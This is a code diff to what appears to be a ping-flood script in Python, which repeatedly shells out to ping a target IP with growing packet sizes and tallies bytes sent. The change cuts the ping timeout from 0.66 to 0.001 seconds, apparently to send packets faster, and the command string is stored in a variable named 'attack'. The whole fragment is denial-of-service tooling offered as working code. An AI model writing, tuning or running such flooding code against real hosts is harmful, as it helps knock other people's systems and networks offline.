@@ -27,7 +27,7 @@ if packets == str(""):
 	packets = 1000
 
 while int(packets) >> 0:
-	attack = 'ping -q -W 0.66 -c 1 -s' + str(size) + ' -S ' + str(size) + ' ' + ip + ' | grep nothing'
+	attack = 'ping -q -W 0.001 -w 0.001 -c 1 -s' + str(size) + ' -S ' + str(size) + ' ' + ip + ' | grep nothing'
 	size = int(size) + 1
 	os.system(attack)
 	bytessent = int(bytessent) + int(size)
